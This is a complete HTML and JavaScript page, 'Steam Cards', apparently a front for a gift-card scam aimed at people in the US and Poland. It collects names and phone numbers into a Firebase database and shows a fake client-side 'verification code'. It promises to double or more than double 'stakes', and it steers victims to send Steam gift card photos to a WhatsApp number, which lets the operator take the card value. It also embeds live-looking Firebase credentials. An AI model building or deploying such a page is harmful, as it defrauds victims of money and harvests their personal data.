<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Steam Cards</title>
<style>
:root { --bg:#0b0c10; --card:#111318; --muted:#a9b0b8; --text:#e9eef3; --accent:#22c55e; --danger:#ef4444; --border:#23262d; }
*{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
body{margin:0;background:linear-gradient(160deg,#0b0c10,#0f1115 40%,#0b0c10);color:var(--text);min-height:100vh}
.wrap{max-width:960px;margin:24px auto;padding:20px}
.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:16px}
h1{margin:0 0 10px;font-size:20px}
label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px}
input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid var(--border);background:#0b0d12;color:var(--text)}
.grid{display:grid;gap:12px}
.cols-2{grid-template-columns:1fr 1fr}
.toolbar{display:flex;gap:10px;align-items:center}
.btn{background:#1f2937;color:var(--text);border:0;padding:10px;border-radius:10px;cursor:pointer}
.btn-accent{background:#22c55e;color:#052e13}
.top-right{position:fixed;right:20px;top:20px;display:flex;gap:10px}
.mebtn{background:#0b0d12;border:1px solid var(--border);padding:8px 12px;border-radius:999px;cursor:pointer}
.logoutbtn{background:#ef4444;border:1px solid #b91c1c;padding:8px 12px;border-radius:999px;cursor:pointer;color:white}
.options{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:12px}
.option{border:1px solid var(--border);padding:12px;border-radius:10px;background:transparent}
.option h3{margin:0 0 6px;font-size:16px}
.small{font-size:13px;color:var(--muted)}
.hidden{display:none}
.center{text-align:center}
.badge{display:inline-block;padding:6px 10px;border-radius:999px;background:#0b0d12;border:1px solid var(--border);color:var(--muted);font-size:13px}
.notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
.small-muted{font-size:12px;color:var(--muted)}
.whatsapp-btn{margin-top:12px;background:#25D366;color:#fff;border:0;padding:10px;border-radius:10px;cursor:pointer;text-align:center;display:block;width:100%;text-decoration:none}
</style>
</head>
<body>
<div class="top-right hidden" id="topBar">
  <button id="meBtn" class="mebtn">me ðŸš¹</button>
  <button id="logoutBtn" class="logoutbtn">Logout</button>
</div>

<div class="wrap">
  <!-- Signup/Login -->
  <div id="gate" class="card">
    <h1 id="title">Welcome â€” Signup / Login (US & Poland only)</h1>
    <div class="grid cols-2" style="margin-top:10px">
      <div>
        <label for="country" id="countryLabel">Country</label>
        <select id="country">
          <option value="">Chooseâ€¦</option>
          <option value="PL">Poland</option>
          <option value="US">United States</option>
        </select>
      </div>
      <div>
        <label for="lang" id="languageLabel">Language</label>
        <select id="lang">
          <option value="pl">Polski</option>
          <option value="en" selected>English</option>
        </select>
      </div>
    </div>
    <div style="margin-top:12px" class="grid">
      <div>
        <label for="name" id="nameLabel">Name</label>
        <input id="name" placeholder="Your name">
      </div>
      <div>
        <label for="phone" id="phoneLabel">Phone</label>
        <input id="phone" placeholder="+48 ... or +1 ...">
      </div>
    </div>
    <div style="margin-top:12px" class="toolbar">
      <button id="sendCode" class="btn-accent">Send code</button>
      <div id="codeSent" class="badge">Not sent</div>
    </div>
    <div id="verifyRow" class="grid hidden" style="margin-top:12px">
      <div>
        <label for="code" id="codeLabel">Enter code</label>
        <input id="code" placeholder="Enter code">
      </div>
      <div class="center">
        <button id="finishSignup" class="btn-accent" style="margin-top:22px">Finish login</button>
      </div>
    </div>
  </div>

  <!-- Home -->
  <div id="home" class="card hidden">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <h1 id="uploadTitle">Upload a card</h1>
        <div id="uploadSubtitle" class="small-muted">United States & Poland only â€” Steam gift card uploads only.</div>
      </div>
      <div class="center">
        <div class="small-muted" id="balanceLabel">Balance</div>
        <div id="balanceDisplay" style="font-size:18px;font-weight:700">0.00 PLN</div>
      </div>
    </div>
    <div style="margin-top:12px">
      <div class="small-muted" id="chooseMethod">Choose method you want to earn:</div>
      <div class="options" id="optionsList"></div>
      <a id="whatsappLink" class="whatsapp-btn" target="_blank">ðŸ“· Send Card Photo via WhatsApp</a>
    </div>
  </div>
</div>

<div id="notif" class="notif hidden"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyC24O6ZV8kHo9rqTr88ERBsRLgbK_Dez8k",
  authDomain: "admin-panel-database-6e378.firebaseapp.com",
  projectId: "admin-panel-database-6e378",
  storageBucket: "admin-panel-database-6e378.firebasestorage.app",
  messagingSenderId: "296556886458",
  appId: "1:296556886458:web:dfd1382b99a6b774ec0583"
};
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let currentUser = null;
const WHATSAPP_NUMBER = "2348108462471";

// âœ… Options with stake & profit
const OPTIONS = [
  { stake: 50, profit: 100 },
  { stake: 100, profit: 220 },
  { stake: 200, profit: 500 }
];

// âœ… Auto-fill prefix and switch language
document.getElementById("country").addEventListener("change", e => {
  if (e.target.value === "PL") {
    document.getElementById("phone").value = "+48 ";
    document.getElementById("lang").value = "pl";
    switchLanguage("pl");
  }
  if (e.target.value === "US") {
    document.getElementById("phone").value = "+1 ";
    document.getElementById("lang").value = "en";
    switchLanguage("en");
  }
});

document.getElementById("lang").addEventListener("change", e => switchLanguage(e.target.value));

function switchLanguage(lang) {
  const t = (en, pl) => (lang === "pl" ? pl : en);
  document.getElementById("title").textContent = t("Welcome â€” Signup / Login (US & Poland only)", "Witamy â€” Rejestracja / Logowanie (tylko USA i Polska)");
  document.getElementById("countryLabel").textContent = t("Country", "Kraj");
  document.getElementById("languageLabel").textContent = t("Language", "JÄ™zyk");
  document.getElementById("nameLabel").textContent = t("Name", "ImiÄ™");
  document.getElementById("phoneLabel").textContent = t("Phone", "Telefon");
  document.getElementById("sendCode").textContent = t("Send code", "WyÅ›lij kod");
  document.getElementById("uploadTitle").textContent = t("Upload a card", "PrzeÅ›lij kartÄ™");
  document.getElementById("uploadSubtitle").textContent = t("United States & Poland only â€” Steam gift card uploads only.", "Tylko Stany Zjednoczone i Polska â€” tylko karty Steam.");
  document.getElementById("balanceLabel").textContent = t("Balance", "Saldo");
  document.getElementById("chooseMethod").textContent = t("Choose method you want to earn:", "Wybierz metodÄ™ zarabiania:");
  document.getElementById("whatsappLink").textContent = t("ðŸ“· Send Card Photo via WhatsApp", "ðŸ“· WyÅ›lij zdjÄ™cie karty na WhatsApp");
}

// âœ… Generate 6-digit verification code
function generateCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// âœ… Listen for real-time balance updates
function listenForBalanceUpdates(phone) {
  onSnapshot(collection(db, "users"), snapshot => {
    snapshot.forEach(docSnap => {
      const data = docSnap.data();
      if (data.phone === phone) {
        currentUser = data;
        document.getElementById("balanceDisplay").textContent = data.balance.toFixed(2) + " PLN";
      }
    });
  });
}

// âœ… Handle send code
document.getElementById("sendCode").addEventListener("click", async () => {
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();

  if (!/^\+\d{8,15}$/.test(phone)) {
    alert("Please enter a valid phone number with country code.");
    return;
  }

  const code = generateCode();
  document.getElementById("codeSent").textContent = "Code sent: " + code;
  document.getElementById("verifyRow").classList.remove("hidden");
});

// âœ… Handle finish signup
document.getElementById("finishSignup").addEventListener("click", async () => {
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  await addDoc(collection(db, "users"), { name, phone, balance: 0, pendingApproval: true });
  listenForBalanceUpdates(phone);
  buildOptions();
  document.getElementById("home").classList.remove("hidden");
  document.getElementById("gate").classList.add("hidden");
  document.getElementById("whatsappLink").href = `https://wa.me/${WHATSAPP_NUMBER}?text=Hi,%20I%20want%20to%20send%20my%20Steam%20card%20photo.`;
});

// âœ… Build stake options
function buildOptions() {
  const container = document.getElementById("optionsList");
  container.innerHTML = "";
  OPTIONS.forEach(opt => {
    const div = document.createElement("div");
    div.className = "option";
    div.innerHTML = `<h3>${opt.stake} PLN</h3><div class="small">Profit: ${opt.profit} PLN</div><button class="btn-accent" style="margin-top:8px">Choose</button>`;
    div.querySelector("button").addEventListener("click", () => {
      window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=Hi,%20I%20choose%20${opt.stake}PLN%20stake%20for%20${opt.profit}PLN%20profit.`, "_blank");
    });
    container.appendChild(div);
  });
}
</script>
</body>
</html>